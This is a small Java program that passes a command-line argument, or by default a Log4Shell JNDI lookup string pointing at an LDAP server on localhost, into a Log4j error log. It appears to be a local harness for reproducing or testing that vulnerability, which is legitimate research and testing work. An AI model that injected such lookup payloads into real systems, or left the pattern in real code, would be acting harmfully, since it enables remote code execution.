package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Main {
    public static void main(String[] args) {
        String loggingStatement = (args.length >= 1 ? args[0] : "${jndi:ldap://localhost:1389/o=reference}");

        LogAsError(loggingStatement);
    }

    public static void LogAsError(String message) {
        Logger logger = LogManager.getLogger();
        logger.error(message);
    }
}